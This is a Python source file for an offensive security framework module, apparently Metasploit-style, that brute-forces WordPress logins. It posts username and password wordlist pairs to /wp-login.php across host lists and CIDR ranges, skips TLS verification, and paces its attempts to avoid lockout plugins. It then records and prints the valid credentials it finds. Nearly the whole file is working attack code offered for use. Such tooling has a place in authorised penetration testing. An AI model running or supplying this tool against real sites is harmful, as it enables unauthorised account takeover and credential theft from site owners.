import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

LOGIN_PATH = "/wp-login.php"

FAIL_MARKERS = (
    "login_error",
    "Invalid username",
    "The password you entered",
    "Unknown username",
    "is not registered",
)

SUCCESS_MARKER = "wp-admin-bar-logout"


@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""
    username: str = ""
    password: str = ""


class WordPressLoginBruteforce(Auxiliary):
    NAME = "WordPress Login Bruteforce Scanner"
    DESCRIPTION = (
        "Tests WordPress credentials against /wp-login.php using a username "
        "and a password wordlist. WordPress does not accept user:pass pairs; "
        "the login form posts log=<username>&pwd=<password> for each attempt. "
        "Detects success by checking for the wp-admin-bar-logout marker in the "
        "response. Supports a single username or a username file. Records "
        "valid credentials to the workspace. A delay between attempts is "
        "recommended to avoid triggering brute-force protection plugins."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "normal"
    SEVERITY = "critical"
    CHECK = True
    REFERENCES = [
        "https://developer.wordpress.org/apis/security/",
        "https://wordpress.org/documentation/article/brute-force-attacks/",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=80, type=int, description="HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("USERNAME", default="admin",
               description="single username to test"),
        Option("USERNAMES", default="",
               description="path to a file with one username per line (overrides USERNAME)"),
        Option("PASSWORD_FILE", required=True,
               description="path to a file with one password per line"),
        Option("DELAY", default=1.0, type=float,
               description="seconds between login attempts (avoid lockouts)"),
        Option("TIMEOUT", default=10.0, type=float, description="per-request timeout"),
        Option("THREADS", default=1, type=int,
               description="concurrent workers (keep low to avoid lockouts)"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first successful login"),
        Option("USER_AGENT", default="Mozilla/5.0 (metis)",
               description="User-Agent header sent with each request"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base_url(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _load_usernames(self):
        path = self.options["USERNAMES"].strip()
        if path:
            try:
                with open(path, "r", errors="replace") as f:
                    names = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
                if names:
                    return names
            except OSError as e:
                print(colors.bad("could not read USERNAMES file: " + str(e)))
                return []
        return [self.options["USERNAME"].strip()]

    def _load_passwords(self):
        path = self.options["PASSWORD_FILE"].strip()
        if not path:
            print(colors.bad("PASSWORD_FILE is required"))
            return []
        try:
            with open(path, "r", errors="replace") as f:
                return [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
        except OSError as e:
            print(colors.bad("could not read PASSWORD_FILE: " + str(e)))
            return []

    def _attempt(self, host, username, password):
        url = self._base_url(host) + LOGIN_PATH
        ctx = ssl._create_unverified_context()
        cookie_jar = urllib.request.HTTPCookieProcessor()
        opener = urllib.request.build_opener(
            cookie_jar,
            urllib.request.HTTPSHandler(context=ctx),
        )
        try:
            opener.open(
                urllib.request.Request(
                    url,
                    headers={"User-Agent": self.options["USER_AGENT"]},
                ),
                timeout=self.options["TIMEOUT"],
            )
        except (urllib.error.URLError, OSError):
            pass

        body = urllib.parse.urlencode({
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": self._base_url(host) + "/wp-admin/",
            "testcookie": "1",
        }).encode()

        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("User-Agent", self.options["USER_AGENT"])
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("Referer", url)

        try:
            with opener.open(req, timeout=self.options["TIMEOUT"]) as r:
                return SUCCESS_MARKER in r.read(200_000).decode(errors="replace")
        except urllib.error.HTTPError as e:
            return SUCCESS_MARKER in e.read(200_000).decode(errors="replace")
        except (urllib.error.URLError, OSError):
            return False

    def _probe(self, host):
        result = HostResult(host=host)
        usernames = self._load_usernames()
        passwords = self._load_passwords()

        if not usernames:
            result.detail = "no usernames to test"
            return result
        if not passwords:
            result.detail = "no passwords to test"
            return result

        try:
            url = self._base_url(host) + LOGIN_PATH
            ctx = ssl._create_unverified_context()
            req = urllib.request.Request(url)
            req.add_header("User-Agent", self.options["USER_AGENT"])
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                page = r.read(200_000).decode(errors="replace")
        except (urllib.error.URLError, OSError) as e:
            result.detail = type(e).__name__
            return result

        if "wp-submit" not in page and "user_login" not in page:
            result.state = "safe"
            result.detail = "not a WordPress login page"
            return result

        delay = max(0.0, float(self.options["DELAY"]))
        attempts = 0

        for username in usernames:
            for password in passwords:
                if attempts > 0 and delay > 0:
                    time.sleep(delay)
                attempts += 1
                try:
                    if self._attempt(host, username, password):
                        result.state = "vulnerable"
                        result.username = username
                        result.password = password
                        result.detail = "valid credentials: " + username + ":" + password
                        return result
                except Exception:
                    continue

        result.state = "safe"
        result.detail = (
            str(attempts) + " attempt(s) across "
            + str(len(usernames)) + " user(s) - no valid credentials"
        )
        return result

    def _record_host_result(self, h):
        svc_name = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, self.options["RPORT"],
            proto="tcp", state="open",
            name=svc_name, banner="WordPress",
        )
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="critical",
            info="WordPress admin login brute-forced",
        )
        if h.username:
            self.report_cred(
                h.host, h.username, h.password,
                kind="password",
                info="WordPress /wp-login.php brute-force success",
            )

    def check(self):
        targets = self._expand_targets()
        if len(targets) > 1:
            print(colors.warn(
                "check on multiple targets: probing only " + targets[0] +
                " (use 'run' to scan all " + str(len(targets)) + ")"
            ))
        host = targets[0]
        print(colors.info("check: probing " + self._base_url(host) + LOGIN_PATH))

        r = self._probe(host)

        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " - " + r.detail))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " - " + r.detail))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info(
            "scanning " + str(len(targets)) + " host(s) with "
            + str(threads) + " threads"
        ))
        if threads > 1:
            print(colors.warn(
                "  THREADS > 1 may trigger brute-force lockouts; "
                "consider THREADS 1 and DELAY 1.0"
            ))

        bar = ProgressBar(total=len(targets), prefix="scan")
        hits = []
        clean = 0
        unknown = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        r = fut.result()
                    except Exception:
                        unknown += 1
                        continue

                    if r.state == "vulnerable":
                        hits.append(r)
                        bar.log(colors.vuln(r.host + " - " + r.detail))
                        if workspace_active:
                            self._record_host_result(r)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif r.state == "safe":
                        clean += 1
                    else:
                        unknown += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  valid creds:  " + colors.green(str(len(hits))))
        print("  no creds:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s), {len(hits)} cred(s) in workspace '{ws}'"
            ))
        if hits:
            print(colors.heading("  valid credentials:"))
            for h in hits:
                print("    " + colors.vuln(h.host) + "  "
                      + colors.session(h.username + ":" + h.password))

        return hits
